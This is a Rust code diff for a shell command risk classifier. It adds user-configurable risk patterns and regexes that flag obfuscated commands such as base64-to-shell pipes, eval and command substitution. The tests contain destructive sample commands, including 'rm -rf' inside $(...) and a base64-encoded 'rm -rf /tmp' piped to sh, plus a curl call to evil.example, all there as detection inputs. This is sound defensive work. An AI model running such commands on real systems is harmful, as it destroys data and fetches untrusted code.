@@ -44,6 +44,62 @@ fn is_ignored(cmd: &str) -> bool {
         .is_some_and(|pats| matches_any(cmd, pats))
 }
 
+/// A compiled user-defined risk pattern (`agent.risk_extra_patterns`).
+/// `description`/`level` are owned (unlike the built-in `RiskPattern`'s
+/// `&'static str`s) since they come from user config, not a compile-time
+/// literal.
+struct ExtraRiskPattern {
+    regex: Regex,
+    level: RiskLevel,
+    description: String,
+}
+
+/// User-configured additional risk patterns to flag — the complement to
+/// `RISK_IGNORE_PATTERNS`, which only suppresses. Empty until
+/// `set_extra_patterns` is called at startup.
+static RISK_EXTRA_PATTERNS: OnceLock<Vec<ExtraRiskPattern>> = OnceLock::new();
+
+/// Install user-configured extra risk patterns. Call once at startup. A
+/// pattern with an invalid regex or an unparseable `level` is skipped with a
+/// warning (matching `set_ignore_patterns`'s behavior for invalid regexes).
+/// A second call is a no-op (`OnceLock`).
+pub fn set_extra_patterns(patterns: &[crate::config::RiskPatternConfig]) {
+    if patterns.is_empty() {
+        return;
+    }
+    let compiled: Vec<ExtraRiskPattern> = patterns
+        .iter()
+        .filter_map(|p| {
+            let regex = match Regex::new(&p.pattern) {
+                Ok(re) => re,
+                Err(e) => {
+                    eprintln!("suvadu: invalid risk_extra_pattern '{}': {e}", p.pattern);
+                    return None;
+                }
+            };
+            let Ok(level) = p.level.parse::<RiskLevel>() else {
+                eprintln!(
+                    "suvadu: invalid risk_extra_pattern level '{}' for '{}' — \
+                     expected low/medium/high/critical",
+                    p.level, p.pattern
+                );
+                return None;
+            };
+            let description = if p.description.is_empty() {
+                "Custom pattern".to_string()
+            } else {
+                p.description.clone()
+            };
+            Some(ExtraRiskPattern {
+                regex,
+                level,
+                description,
+            })
+        })
+        .collect();
+    let _ = RISK_EXTRA_PATTERNS.set(compiled);
+}
+
 /// Risk severity levels for command classification
 #[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
 pub enum RiskLevel {
@@ -84,6 +140,22 @@ impl RiskLevel {
     }
 }
 
+impl std::str::FromStr for RiskLevel {
+    type Err = ();
+
+    /// Case-insensitive; matches `label()`'s output plus "none"/"safe".
+    fn from_str(s: &str) -> Result<Self, Self::Err> {
+        match s.to_lowercase().as_str() {
+            "none" | "safe" => Ok(Self::None),
+            "low" => Ok(Self::Low),
+            "medium" => Ok(Self::Medium),
+            "high" => Ok(Self::High),
+            "critical" => Ok(Self::Critical),
+            _ => Err(()),
+        }
+    }
+}
+
 impl std::fmt::Display for RiskLevel {
     fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
         write!(f, "{}", self.label())
@@ -98,12 +170,16 @@ struct RiskPattern {
     description: &'static str,
 }
 
-/// Result of assessing risk for a single command
+/// Result of assessing risk for a single command. `category`/`description`
+/// are `Cow` rather than `&'static str` because a match against a
+/// user-configured `risk_extra_patterns` entry (see [`set_extra_patterns`])
+/// carries an owned, config-supplied description — built-in matches still
+/// borrow their `&'static str` literals at zero cost.
 #[derive(Debug, Clone)]
 pub struct RiskAssessment {
     pub level: RiskLevel,
-    pub category: &'static str,
-    pub description: &'static str,
+    pub category: std::borrow::Cow<'static, str>,
+    pub description: std::borrow::Cow<'static, str>,
 }
 
 /// Aggregate risk summary for a set of entries
@@ -137,6 +213,7 @@ fn build_patterns() -> Vec<RiskPattern> {
     let mut defs = Vec::with_capacity(40);
     defs.extend(critical_pattern_defs());
     defs.extend(high_pattern_defs());
+    defs.extend(obfuscation_pattern_defs());
     defs.extend(medium_pattern_defs());
     defs.extend(low_pattern_defs());
 
@@ -309,6 +386,37 @@ fn high_pattern_defs() -> Vec<PatternDef> {
     ]
 }
 
+/// Obfuscation/indirection: regexes match literal command text, so anything
+/// that constructs or hides the real command at runtime defeats every
+/// pattern above it. These don't close that gap (no AST here), but they
+/// flag the indirection itself as worth a second look — the same principle
+/// as flagging `curl | sh` without needing to know what the downloaded
+/// script does.
+fn obfuscation_pattern_defs() -> Vec<PatternDef> {
+    vec![
+        (
+            r"(?i)base64\s+(-d|--decode|-D)\b.*\|\s*(sh|bash|zsh)\b",
+            RiskLevel::High,
+            "obfuscation",
+            "Decode base64 and pipe to a shell",
+        ),
+        (
+            r"(^|\s)eval\s+\S",
+            RiskLevel::High,
+            "obfuscation",
+            "eval executes a dynamically-built command — its real contents \
+             can't be checked from the command text alone",
+        ),
+        (
+            r"\$\([^)]*\b(rm\s+-rf|curl|wget|dd\s|mkfs|base64|eval)\b[^)]*\)",
+            RiskLevel::High,
+            "obfuscation",
+            "Command substitution invokes a network/destructive command — \
+             it runs before the outer command does",
+        ),
+    ]
+}
+
 fn medium_pattern_defs() -> Vec<PatternDef> {
     vec![
         (
@@ -383,24 +491,36 @@ pub fn assess_risk(command: &str) -> Option<RiskAssessment> {
         return None;
     }
 
-    // Find the highest-risk matching pattern
-    let mut best: Option<&RiskPattern> = None;
+    // Find the highest-risk matching pattern across both the built-in set
+    // and any user-configured `risk_extra_patterns` — a user pattern can
+    // win (or lose to) a built-in one purely on severity, same as two
+    // built-ins competing today.
+    let mut best: Option<RiskAssessment> = None;
 
     for p in patterns {
-        if p.regex.is_match(cmd) {
-            match &best {
-                Some(current) if p.level > current.level => best = Some(p),
-                None => best = Some(p),
-                _ => {}
+        if p.regex.is_match(cmd) && best.as_ref().is_none_or(|current| p.level > current.level) {
+            best = Some(RiskAssessment {
+                level: p.level,
+                category: std::borrow::Cow::Borrowed(p.category),
+                description: std::borrow::Cow::Borrowed(p.description),
+            });
+        }
+    }
+
+    if let Some(extra) = RISK_EXTRA_PATTERNS.get() {
+        for p in extra {
+            if p.regex.is_match(cmd) && best.as_ref().is_none_or(|current| p.level > current.level)
+            {
+                best = Some(RiskAssessment {
+                    level: p.level,
+                    category: std::borrow::Cow::Borrowed("custom"),
+                    description: std::borrow::Cow::Owned(p.description.clone()),
+                });
             }
         }
     }
 
-    best.map(|p| RiskAssessment {
-        level: p.level,
-        category: p.category,
-        description: p.description,
-    })
+    best
 }
 
 /// Returns true if the command doesn't actually execute the matched operation.
@@ -454,6 +574,16 @@ const fn has_shell_chaining(cmd: &str) -> bool {
             in_double = !in_double;
             i += 1;
             continue;
+        }
+
+        // Command substitution executes even inside double quotes — only
+        // single quotes are fully literal in bash. So `echo "$(rm -rf /)"`
+        // still runs `rm -rf /` before echo ever sees its argument.
+        if !in_single && b == b'`' {
+            return true;
+        }
+        if !in_single && b == b'$' && i + 1 < len && bytes[i + 1] == b'(' {
+            return true;
         }
 
         // Only detect operators when outside all quotes
@@ -704,6 +834,64 @@ mod tests {
     }
 
     #[test]
+    fn test_obfuscation_patterns() {
+        assert_eq!(
+            risk_level("echo cm0gLXJmIC90bXA= | base64 -d | sh"),
+            RiskLevel::High
+        );
+        assert_eq!(
+            risk_level("echo cm0gLXJmIC90bXA= | base64 --decode | bash"),
+            RiskLevel::High
+        );
+        assert_eq!(risk_level("eval $CMD"), RiskLevel::High);
+        assert_eq!(risk_level("eval \"rm -rf /tmp/x\""), RiskLevel::High);
+        assert_eq!(
+            risk_level("echo $(curl -s https://evil.example/x)"),
+            RiskLevel::High
+        );
+        // Flagged via the $(...) obfuscation pattern, not the top-level `rm
+        // -rf` pattern — that one requires `rm` at the start or after
+        // whitespace, which isn't the case once it's inside `$(...)`.
+        assert_eq!(risk_level("VAR=$(rm -rf /important)"), RiskLevel::High);
+        // Plain command substitution with a harmless inner command is unaffected.
+        assert_eq!(risk_level("echo $(date)"), RiskLevel::None);
+        // "retrieval" etc. must not false-positive on the `eval` substring.
+        assert_eq!(risk_level("echo data retrieval complete"), RiskLevel::None);
+    }
+
+    #[test]
+    fn test_extra_patterns_can_flag_and_can_be_outranked() {
+        use crate::config::RiskPatternConfig;
+
+        // Own static so this test's OnceLock write doesn't race other tests
+        // in this file that also touch RISK_EXTRA_PATTERNS.
+        set_extra_patterns(&[
+            RiskPatternConfig {
+                pattern: r"^my-internal-deploy\b".to_string(),
+                level: "critical".to_string(),
+                description: "Org deploy script".to_string(),
+            },
+            RiskPatternConfig {
+                pattern: r"^totally-invalid-level\b".to_string(),
+                level: "not-a-level".to_string(),
+                description: String::new(),
+            },
+        ]);
+
+        let assessment = assess_risk("my-internal-deploy --prod").unwrap();
+        assert_eq!(assessment.level, RiskLevel::Critical);
+        assert_eq!(assessment.category, "custom");
+        assert_eq!(assessment.description, "Org deploy script");
+
+        // Invalid level is skipped, not panicked on — this command matches no
+        // pattern (built-in or extra) at all, so it stays safe.
+        assert_eq!(risk_level("totally-invalid-level foo"), RiskLevel::None);
+
+        // A built-in Critical pattern still outranks a matching extra Low one.
+        assert_eq!(risk_level("rm -rf /tmp/build"), RiskLevel::Critical);
+    }
+
+    #[test]
     fn test_high_irreversible_patterns() {
         // git clean with a force flag
         assert_eq!(risk_level("git clean -fd"), RiskLevel::High);
@@ -886,6 +1074,21 @@ mod tests {
     }
 
     // ── has_shell_chaining quote-awareness tests ────────────────────────
+
+    #[test]
+    fn test_chaining_command_substitution() {
+        // Command substitution executes even inside double quotes or with
+        // no quotes at all — only single quotes are fully literal in bash.
+        assert!(has_shell_chaining("echo $(rm -rf /tmp)"));
+        assert!(has_shell_chaining(r#"echo "$(rm -rf /tmp)""#));
+        assert!(has_shell_chaining("echo `rm -rf /tmp`"));
+        assert!(has_shell_chaining(r#"echo "`rm -rf /tmp`""#));
+        // Single-quoted: bash treats this fully literally, nothing runs.
+        assert!(!has_shell_chaining("echo '$(rm -rf /tmp)'"));
+        assert!(!has_shell_chaining("echo '`rm -rf /tmp`'"));
+        // A bare '$' with no following '(' is not substitution.
+        assert!(!has_shell_chaining("echo price is $5"));
+    }
 
     #[test]
     fn test_chaining_unquoted_pipe() {
